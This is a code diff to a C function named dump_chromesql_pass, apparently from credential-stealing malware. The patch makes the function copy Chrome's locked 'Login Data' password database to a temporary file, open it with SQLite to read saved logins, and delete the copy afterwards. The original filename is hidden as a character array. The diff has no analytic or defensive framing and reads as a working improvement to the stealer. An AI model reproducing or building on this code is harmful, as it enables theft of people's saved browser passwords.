@@ -144,8 +144,15 @@ VOID dump_chromesql_pass()
 
 	DWORD dwSize = strlen(strProfilePath) + 1024;
 	LPSTR strFilePath = (LPSTR)talloc(dwSize);
-	CHAR strFileName[] = { 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', 0x0 };
+	
+	SetCurrentDirectory(strProfilePath);
+	char cwd[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, cwd);
+	CopyFile("Login Data", "templogin", 0);
+	
+	CHAR strFileName[] = { 't', 'e', 'm', 'p', 'l', 'o', 'g', 'i', 'n', 0x0 };
 	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);
+	
 	sqlite3 *lpDb = NULL;
 	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
 	{
@@ -156,6 +163,7 @@ VOID dump_chromesql_pass()
 		sqlite3_close(lpDb);
 	}
 
+	DeleteFile("templogin");
 	tfree(strFilePath);
 	tfree(strProfilePath);
 }
